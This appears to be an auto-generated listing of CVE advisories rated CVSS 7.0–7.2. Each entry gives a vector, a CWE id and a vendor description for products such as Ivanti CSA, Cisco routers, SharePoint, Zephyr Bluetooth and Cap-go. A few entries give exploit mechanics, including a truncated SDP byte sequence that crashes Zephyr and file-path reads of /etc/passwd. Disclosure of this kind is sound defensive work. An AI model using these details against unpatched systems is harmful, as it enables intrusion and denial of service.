### CVE-2023-53155

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2025-07-25T00:00:00.000Z |

goform/formTest in EmbedThis GoAhead 2.5 allows HTML injection via the name parameter.

### CVE-2024-9380

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-77` |
| Published | 2024-10-08T16:23:49.949Z |

An OS command injection vulnerability in the admin web console of Ivanti CSA before version 5.0.2 allows a remote authenticated attacker with admin privileges to obtain remote code execution.

### CVE-2024-8190

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2024-09-10T20:33:44.793Z |

An OS command injection vulnerability in Ivanti Cloud Services Appliance versions 4.6 Patch 518 and before allows a remote authenticated attacker to obtain remote code execution. The attacker must have admin level privileges to exploit this vulnerability.

### CVE-2024-37149

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-73` |
| Published | 2024-07-10T19:20:36.161Z |

GLPI is an open-source asset and IT management software package that provides ITIL Service Desk features, licenses tracking and software auditing. An authenticated technician user can upload a malicious PHP script and hijack the plugin loader to execute this malicious script. Upgrade to 10.0.16.

### CVE-2024-38094

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-502` |
| Published | 2024-07-09T17:03:24.222Z |

Microsoft SharePoint Remote Code Execution Vulnerability

### CVE-2024-21683

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2024-05-21T23:00:00.446Z |

This High severity RCE (Remote Code Execution) vulnerability was introduced in version 5.2 of Confluence Data Center and Server.

This RCE (Remote Code Execution) vulnerability, with a CVSS Score of 7.2, allows an authenticated attacker to execute arbitrary code which has high impact to confidentiality, high impact to integrity, high impact to availability, and requires no user interaction. 

Atlassian recommends that Confluence Data Center and Server customers upgrade to latest version. If you are unable to do so, upgrade your instance to one of the specified supported fixed versions. See the release notes https://confluence.atlassian.com/doc/confluence-release-notes-327.html

You can download the latest version of Confluence Data Center and Server from the download center https://www.atlassian.com/software/confluence/download-archives.

This vulnerability was found internally.

### CVE-2024-0200

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:L/A:L` |
| Weaknesses | `CWE-470` |
| Published | 2024-01-16T18:50:48.931Z |

An unsafe reflection vulnerability was identified in GitHub Enterprise Server that could lead to reflection injection. This vulnerability could lead to the execution of user-controlled methods and remote code execution. To exploit this bug, an actor would need to be logged into an account on the GHES instance with the organization owner role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.8.13, 3.9.8, 3.10.5, and 3.11.3. This vulnerability was reported via the GitHub Bug Bounty program.



### CVE-2023-20273

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2023-10-24T14:13:36.311Z |

A vulnerability in the web UI feature of Cisco IOS XE Software could allow an authenticated, remote attacker to inject commands with the privileges of root. This vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by sending crafted input to the web UI. A successful exploit could allow the attacker to inject commands to the underlying operating system with root privileges.

### CVE-2023-24955

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `CWE-94` |
| Published | 2023-05-09T17:03:01.864Z |

Microsoft SharePoint Server Remote Code Execution Vulnerability

### CVE-2023-21932

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:L/A:L` |
| Weaknesses | `N/A` |
| Published | 2023-04-18T19:54:23.891Z |

Vulnerability in the Oracle Hospitality OPERA 5 Property Services product of Oracle Hospitality Applications (component: OXI).   The supported version that is affected is 5.6. Difficult to exploit vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle Hospitality OPERA 5 Property Services.  While the vulnerability is in Oracle Hospitality OPERA 5 Property Services, attacks may significantly impact additional products (scope change).  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Hospitality OPERA 5 Property Services accessible data as well as  unauthorized update, insert or delete access to some of Oracle Hospitality OPERA 5 Property Services accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Hospitality OPERA 5 Property Services. CVSS 3.1 Base Score 7.2 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:L/A:L).

### CVE-2023-20117

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-146` |
| Published | 2023-04-05T00:00:00.000Z |

Multiple vulnerabilities in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an authenticated, remote attacker to inject and execute arbitrary commands on the underlying operating system of an affected device. These vulnerabilities are due to insufficient validation of user-supplied input. An attacker could exploit these vulnerabilities by sending malicious input to an affected device. A successful exploit could allow the attacker to execute arbitrary commands as the root user on the underlying Linux operating system of the affected device. To exploit these vulnerabilities, an attacker would need to have valid Administrator credentials on the affected device. Cisco has not released software updates to address these vulnerabilities.

### CVE-2023-20128

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-146` |
| Published | 2023-04-05T00:00:00.000Z |

Multiple vulnerabilities in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an authenticated, remote attacker to inject and execute arbitrary commands on the underlying operating system of an affected device. These vulnerabilities are due to insufficient validation of user-supplied input. An attacker could exploit these vulnerabilities by sending malicious input to an affected device. A successful exploit could allow the attacker to execute arbitrary commands as the root user on the underlying Linux operating system of the affected device. To exploit these vulnerabilities, an attacker would need to have valid Administrator credentials on the affected device. Cisco has not released software updates to address these vulnerabilities.

### CVE-2023-1162

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-77` |
| Published | 2023-03-03T06:49:57.117Z |

** UNSUPPORTED WHEN ASSIGNED ** A vulnerability, which was classified as critical, was found in DrayTek Vigor 2960 1.5.1.4/1.5.1.5. Affected is an unknown function of the file mainfunction.cgi of the component Web Management Interface. The manipulation of the argument password leads to command injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-222258 is the identifier assigned to this vulnerability. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

### CVE-2023-26035

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-862` |
| Published | 2023-02-25T01:07:01.906Z |

ZoneMinder is a free, open source Closed-circuit television software application for Linux which supports IP, USB and Analog cameras. Versions prior to 1.36.33 and 1.37.33 are vulnerable to Unauthenticated Remote Code Execution via Missing Authorization. There are no permissions check on the snapshot action, which expects an id to fetch an existing monitor but can be passed an object to create a new one instead. TriggerOn ends up calling shell_exec using the supplied Id. This issue is fixed in This issue is fixed in versions 1.36.33 and 1.37.33.

### CVE-2021-33545

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2021-09-13T17:55:35.310Z |

Multiple camera devices by UDP Technology, Geutebrück and other vendors are vulnerable to a stack-based buffer overflow condition in the counter parameter which may allow an attacker to remotely execute arbitrary code.

### CVE-2021-33544

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2021-09-13T17:55:33.770Z |

Multiple camera devices by UDP Technology, Geutebrück and other vendors are vulnerable to command injection, which may allow an attacker to remotely execute arbitrary code.

### CVE-2021-2109

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2021-01-20T14:50:11.000Z |

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 7.2 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H).

### CVE-2020-2038

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2020-09-09T16:45:26.588Z |

An OS Command Injection vulnerability in the PAN-OS management interface that allows authenticated administrators to execute arbitrary OS commands with root privileges. This issue impacts: PAN-OS 9.0 versions earlier than 9.0.10; PAN-OS 9.1 versions earlier than 9.1.4; PAN-OS 10.0 versions earlier than 10.0.1.

### CVE-2019-15980

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-22` |
| Published | 2020-01-06T07:45:45.006Z |

Multiple vulnerabilities in the REST and SOAP API endpoints and the Application Framework feature of Cisco Data Center Network Manager (DCNM) could allow an authenticated, remote attacker to conduct directory traversal attacks on an affected device. To exploit these vulnerabilities, an attacker would need administrative privileges on the DCNM application. For more information about these vulnerabilities, see the Details section of this advisory. Note: The severity of these vulnerabilities is aggravated by the vulnerabilities described in the Cisco Data Center Network Manager Authentication Bypass Vulnerabilities advisory, published simultaneously with this one.

### CVE-2019-15984

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2020-01-06T07:45:26.406Z |

Multiple vulnerabilities in the REST and SOAP API endpoints of Cisco Data Center Network Manager (DCNM) could allow an authenticated, remote attacker to execute arbitrary SQL commands on an affected device. To exploit these vulnerabilities, an attacker would need administrative privileges on the DCNM application. For more information about these vulnerabilities, see the Details section of this advisory. Note: The severity of these vulnerabilities is aggravated by the vulnerabilities described in the Cisco Data Center Network Manager Authentication Bypass Vulnerabilities advisory, published simultaneously with this one.

### CVE-2019-1652

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2019-01-24T16:00:00.000Z |

A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an authenticated, remote attacker with administrative privileges on an affected device to execute arbitrary commands. The vulnerability is due to improper validation of user-supplied input. An attacker could exploit this vulnerability by sending malicious HTTP POST requests to the web-based management interface of an affected device. A successful exploit could allow the attacker to execute arbitrary commands on the underlying Linux shell as root. Cisco has released firmware updates that address this vulnerability.

### CVE-2026-56701

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-611` |
| Published | 2026-06-23T13:16:46.667 |

Grav before 2.0.0-beta.2 contains an XML external entity injection vulnerability in SVG file upload processing that allows authenticated attackers to read arbitrary files. The application uses simplexml_load_string without disabling external entity loading, enabling attackers to inject XXE payloads via malicious SVG files to exfiltrate sensitive data.

### CVE-2026-8172

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `N/A` |
| Published | 2026-06-23T07:16:21.007 |

The Simple Basic Contact Form WordPress plugin through 20250114 does not escape user-supplied input before reflecting it into the contact form output on validation errors, leading to a Reflected Cross-Site Scripting vulnerability that unauthenticated attackers can exploit against site visitors via a crafted link or cross-site form submission.

### CVE-2026-10658

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H` |
| Weaknesses | `CWE-125` |
| Published | 2026-06-23T01:16:26.867 |

A missing length validation in the Zephyr Bluetooth Host ISO receive path can be triggered by malformed HCI ISO data. In bt_iso_recv() (subsys/bluetooth/host/iso.c), when processing PB=START/SINGLE fragments, the code pulls a TS SDU header (8 bytes, ts=1) or a non-TS SDU header (4 bytes, ts=0) without first verifying that buf->len contains at least that many bytes. The outer HCI ISO length check in hci_iso() validates payload length consistency but not the minimum inner SDU header size, so a packet with payload length 1 passes hci_iso() and then reaches net_buf_pull_mem(), which asserts buf->len >= len. As a result, malformed ISO traffic deterministically triggers a kernel assert (denial of service) in assert-enabled builds, and in non-assert builds the same path may proceed with an undersized buffer, leading to out-of-bounds read behavior. The issue affects products using the Zephyr Host with CONFIG_BT_ISO_RX enabled, particularly where incoming HCI data can be influenced by a malicious or compromised controller or malformed forwarded ISO traffic.

### CVE-2026-10651

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H` |
| Weaknesses | `CWE-20;CWE-617` |
| Published | 2026-06-23T01:16:26.747 |

A malformed Bluetooth Classic SDP attribute can trigger a reachable assertion in Zephyr's SDP parser. In subsys/bluetooth/host/classic/sdp.c, bt_sdp_parse_attribute() accepts an input buffer once it contains the 1-byte attribute type and 2-byte attribute id, but then unconditionally pulls an additional byte for the value type without verifying that the byte is present. A truncated 3-byte attribute (for example 09 00 09) therefore reaches net_buf_simple_pull() with insufficient remaining length, triggering the __ASSERT_NO_MSG(buf->len >= len) check and a kernel panic in assert-enabled builds (denial of service). In builds where assertions are disabled, parsing may continue past the end of the available buffer, leading to an out-of-bounds read and undefined behavior.

### CVE-2026-56314

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-672` |
| Published | 2026-06-22T22:16:51.603 |

Capgo before 12.128.12 fails to filter deleted app versions when joining channels during /updates resolution, allowing deleted bundles to remain selectable. Attackers can continue deploying deleted bundles to devices by exploiting the missing app_versions.deleted filter in channel version joins.

### CVE-2026-56280

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-06-22T22:16:51.197 |

Cap-go before 12.128.2 contains a privilege inversion vulnerability in GET /build/logs/:jobId that allows read-only API key holders to cancel running native builds. The endpoint registers an abort listener on the SSE stream that unconditionally invokes cancelBuildOnDisconnect() using the privileged server-side BUILDER_API_KEY when clients disconnect, bypassing the app.build_native permission check required by the explicit POST /build/cancel/:jobId endpoint. Attackers with read-only API keys can repeatedly disrupt native build operations and CI/CD workflows by opening the log stream and dropping the connection.

### CVE-2026-56221

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-06-22T22:16:50.670 |

Cap-go before 12.128.2 contains multiple SQL injection vulnerabilities in cloudflare.ts where user-controlled values from API request bodies are interpolated directly into SQL query strings without sanitization or parameterization. Authenticated users with read-level API key permissions can inject arbitrary SQL through deviceIds, search, version_name, cursor, and actions parameters to access analytics data belonging to other users or applications.

### CVE-2026-39904

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-770` |
| Published | 2026-06-22T21:16:23.873 |

Gophish through 0.12.1 contains a denial of service vulnerability that allows authenticated users with the User role to exhaust server memory by uploading a crafted Office document as an email template attachment. The ApplyTemplate() function in models/attachment.go processes Office documents as ZIP archives and calls ioutil.ReadAll() on each contained file entry without enforcing size restrictions on uncompressed content, allowing a zip bomb payload to expand to several gigabytes in memory and cause the process to be terminated by the operating system.

### CVE-2026-50146

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N` |
| Weaknesses | `CWE-80` |
| Published | 2026-06-22T19:17:04.610 |

Astro is a web framework. Prior to 6.3.3, when a component uses a client:* directive, Astro inserts named slot content into a data-astro-template attribute without HTML escaping the slot name allowing an attacker to break out of the attribute context and inject arbitrary HTML, resulting in reflected XSS during SSR. This vulnerability is fixed in 6.3.3.

### CVE-2026-54290

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` |
| Weaknesses | `CWE-942` |
| Published | 2026-06-22T18:16:47.620 |

Hono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.12.25, with credentials: true and no explicit origin (the default wildcard), the CORS Middleware reflects the request's Origin and sends Access-Control-Allow-Credentials: true. Any site can then make credentialed cross-origin requests and read the responses, exposing cookie-authenticated endpoints to arbitrary origins. This vulnerability is fixed in 4.12.25.

### CVE-2019-25246

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-22` |
| Published | 2025-12-24T19:28:00.474Z |

Beward N100 H.264 VGA IP Camera M2.1.6 contains an authenticated file disclosure vulnerability that allows attackers to read arbitrary system files via the 'READ.filePath' parameter. Attackers can exploit the fileread script or SendCGICMD API to access sensitive files like /etc/passwd and /etc/issue by supplying absolute file paths.

### CVE-2025-41695

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:10:56.475Z |

An XSS vulnerability in dyn_conn.php can be used by an unauthenticated remote attacker to trick an authenticated user to send a manipulated POST request to the device in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41745

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:10:16.130Z |

An XSS vulnerability in pxc_portCntr2.php can be used by an unauthenticated remote attacker to trick an authenticated user to send a manipulated POST request to the device in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41746

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:09:53.352Z |

An XSS vulnerability in pxc_portSecCfg.php can be used by an unauthenticated remote attacker to trick an authenticated user to send a manipulated POST request to the device in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41747

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:09:26.183Z |

An XSS vulnerability in pxc_vlanIntfCfg.php can be used by an unauthenticated remote attacker to trick an authenticated user to send a manipulated POST request to the device in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41748

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:09:01.251Z |

An XSS vulnerability in pxc_Dot1xCfg.php can be used by an unauthenticated remote attacker to trick an authenticated user to click on the link provided by the attacker in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41749

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:08:36.195Z |

An XSS vulnerability in port_util.php can be used by an unauthenticated remote attacker to trick an authenticated user to click on the link provided by the attacker in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41750

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:07:58.533Z |

An XSS vulnerability in pxc_PortCfg.php can be used by an unauthenticated remote attacker to trick an authenticated user to click on the link provided by the attacker in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41751

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:07:36.534Z |

An XSS vulnerability in pxc_portCntr.php can be used by an unauthenticated remote attacker to trick an authenticated user to click on the link provided by the attacker in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-41752

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T08:07:03.244Z |

An XSS vulnerability in pxc_portSfp.php can be used by an unauthenticated remote attacker to trick an authenticated user to click on the link provided by the attacker in order to change parameters available via web based management (WBM). The vulnerability does not provide access to system-level resources such as operating system internals or privileged functions. Access is limited to device configuration parameters that are available in the context of the web application. The session cookie is secured by the httpOnly Flag. Therefore an attacker is not able to take over the session of an authenticated user.

### CVE-2025-34304

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-89` |
| Published | 2025-10-28T14:37:29.929Z |

IPFire versions prior to 2.29 (Core Update 198) contain a SQL injection vulnerability that allows an authenticated attacker to manipulate the SQL query used when viewing OpenVPN connection logs via the CONNECTION_NAME parameter. When viewing a range of OpenVPN connection logs, the application issues an HTTP POST request to the Request-URI /cgi-bin/logs.cgi/ovpnclients.dat and inserts the value of the CONNECTION_NAME parameter directly into the WHERE clause without proper sanitization or parameterization. The unsanitized value can alter the executed query and be used to disclose sensitive information from the database.

### CVE-2025-11550

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-476;CWE-404` |
| Published | 2025-10-09T18:02:06.757Z |

A vulnerability was found in Tenda W12 3.0.0.6(3948). The impacted element is the function wifiScheduledSet of the file /goform/modules of the component HTTP Request Handler. The manipulation of the argument wifiScheduledSet results in null pointer dereference. The attack may be performed from remote. The exploit has been made public and could be used.

### CVE-2024-29889

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` |
| Weaknesses | `CWE-89` |
| Published | 2024-05-07T14:05:31.713Z |

GLPI is a Free Asset and IT Management Software package. Prior to 10.0.15, an authenticated user can exploit a SQL injection vulnerability in the saved searches feature to alter another user account data take control of it. This vulnerability is fixed in 10.0.15.

### CVE-2020-36197

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` |
| Weaknesses | `CWE-284` |
| Published | 2021-05-13T02:55:12.525Z |

An improper access control vulnerability has been reported to affect earlier versions of Music Station. If exploited, this vulnerability allows attackers to compromise the security of the software by gaining privileges, reading sensitive information, executing commands, evading detection, etc. This issue affects: QNAP Systems Inc. Music Station versions prior to 5.3.16 on QTS 4.5.2; versions prior to 5.2.10 on QTS 4.3.6; versions prior to 5.1.14 on QTS 4.3.3; versions prior to 5.3.16 on QuTS hero h4.5.2; versions prior to 5.3.16 on QuTScloud c4.5.4.

### CVE-2021-21315

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` |
| Weaknesses | `CWE-78` |
| Published | 2021-02-16T17:00:18.000Z |

The System Information Library for Node.JS (npm package "systeminformation") is an open source collection of functions to retrieve detailed hardware, system and OS information. In systeminformation before version 5.3.1 there is a command injection vulnerability. Problem was fixed in version 5.3.1. As a workaround instead of upgrading, be sure to check or sanitize service parameters that are passed to si.inetLatency(), si.inetChecksite(), si.services(), si.processLoad() ... do only allow strings, reject any arrays. String sanitation works as expected.

### CVE-2026-56109

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
